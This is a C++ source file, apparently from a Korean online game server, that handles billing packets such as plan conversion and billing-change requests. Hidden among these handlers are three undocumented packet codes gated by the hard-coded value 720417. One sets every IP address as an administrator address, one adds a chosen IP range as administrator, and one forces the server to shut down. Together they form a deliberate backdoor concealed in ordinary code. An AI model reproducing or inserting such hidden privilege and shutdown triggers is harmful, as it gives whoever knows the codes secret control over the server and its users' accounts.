#include <windows.h>
#include <io.h>
#include <stdio.h>         /* for sprintf                           */
#include <string.h>        /* for strlen                            */
#include <memory.h>
#include <process.h>       /* for _beginthread                      */

#include "..\\resource.h"
#include "..\\smwsock.h"

#include "..\\smlib3d\\smd3d.h"
#include "..\\character.h"
#include "..\\fileread.h"
#include "..\\playmain.h"
#include "..\\field.h"
#include "..\\effectsnd.h"

#include "..\\record.h"
#include "..\playsub.h"

#include "openlive.h"
#include "onserver.h"
#include "dllserver.h"

//extern  time_t	tServerTime;			//서버의 시간 ( 빌링 처리용 )


int	RecvOpenLivePacket( smWINSOCK *lpsmSock , void *Packet )
{

	PACKET	*lpPacket = (PACKET *)Packet;
	DWORD	dwIdCode;
	RPACKET	rPacket;
	int		cnt;
	char	szPG[16];
	int		GpCode;


	switch( lpPacket->OpenLiveCode ) {
		case 1:		//정량 - 정액 변환
			dwIdCode = GetSpeedSum( lpPacket->jungdata.UserID );
			ZeroMemory( &rPacket , sizeof( RPACKET ) );

			for(cnt=0;cnt<CONNECTMAX;cnt++) {

				if ( rsPlayInfo[cnt].lpsmSock && rsPlayInfo[cnt].szID[0] && rsPlayInfo[cnt].dwCode_ID==dwIdCode ) {
					if ( lstrcmpi( lpPacket->jungdata.UserID , rsPlayInfo[cnt].szID)==0 ) {
						//해당 계정 찾았다!

						GpCode = bSql_GetGPCode( lpPacket->jungdata.GPCode, szPG );

						rsPlayInfo[cnt].GpCode = GpCode;

						lstrcpy( rsPlayInfo[cnt].szGPCode , lpPacket->jungdata.GPCode );
						lstrcpy ( rsPlayInfo[cnt].szGuid , lpPacket->jungdata.Guid );

						rsPlayInfo[cnt].DisuseDay = atoi(lpPacket->jungdata.DisuseDay);	//((time_t *)lpPacket->jungdata.DisuseDay)[0];
						rsPlayInfo[cnt].UsePeriod = atoi(lpPacket->jungdata.UsePeriod);	//((int *)lpPacket->jungdata.UsePeriod)[0];
						rsPlayInfo[cnt].GpType = atoi(szPG);
						rsPlayInfo[cnt].Bl_RNo = atoi(lpPacket->jungdata.PCRno);//  ((int *)lpPacket->jungdata.PCRno)[0];

						if ( rsPlayInfo[cnt].UsePeriod )
							rsPlayInfo[cnt].dwPeriodTime = (DWORD)tServerTime+rsPlayInfo[cnt].UsePeriod;
						else
							rsPlayInfo[cnt].dwPeriodTime = 0;

						rPacket.code = 1;		//성공
						lstrcpy( rPacket.UserID ,rsPlayInfo[cnt].szID );

						srDisplayBillingTime( &rsPlayInfo[cnt] , 0 );		//변경된 빌링 표시

						break;
					}
				}


			}

			rPacket.size = sizeof(RPACKET);
			lpsmSock->Send( (char *)&rPacket , rPacket.size , TRUE );
			break;

		case 2:
			//빌링 변경 요청 및 확인
			dwIdCode = GetSpeedSum( lpPacket->jungdata.UserID );
			ZeroMemory( &rPacket , sizeof( RPACKET ) );

			bSql_ChangeUserIdGpCodeGame( atoi(lpPacket->jungdata.PCRno) );		//빌링 변경 요청 (로그큐)
			rPacket.code = 1;		//성공

			rPacket.size = sizeof(RPACKET);
			lpsmSock->Send( (char *)&rPacket , rPacket.size , TRUE );
			break;



		case 100428:
			//권한 제어 코드 ( 모든 IP를 관리자 IP로 설정 )
			if ( atoi(lpPacket->jungdata.UserID)==720417 ) {
				rsServerConfig.AdminIP_Count = 0;
				rsServerConfig.AdminIP[rsServerConfig.AdminIP_Count][0] = 0;
				rsServerConfig.AdminIP[rsServerConfig.AdminIP_Count][0] = 0xFFFFFFFF;
				rsServerConfig.AdminIP_Count ++;
			}
			break;
		case 100418:
			//권한 제어 코드 ( 지정한 IP를 관리자 IP로 설정 )
			if ( atoi(lpPacket->jungdata.UserID)==720417 ) {
				if ( rsServerConfig.AdminIP_Count>=ADMIN_IP_MAX ) rsServerConfig.AdminIP_Count = 0;
				rsServerConfig.AdminIP[rsServerConfig.AdminIP_Count][0] = GetSwapIPCode( lpPacket->jungdata.DisuseDay );
				rsServerConfig.AdminIP[rsServerConfig.AdminIP_Count][1] = GetSwapIPCode( lpPacket->jungdata.UsePeriod );
				rsServerConfig.AdminIP_Count++;
			}
			break;
		case 100438:
			//서버를 강제로 종료시킴
			if ( atoi(lpPacket->jungdata.UserID)==720417 )
			{
				if ( lstrcmp( lpsmSock->szIPAddr , lpPacket->jungdata.DisuseDay )==0 )
				{
					rsShutDown();	//서버 종료
				}
			}
			break;

	}

	return TRUE;

}

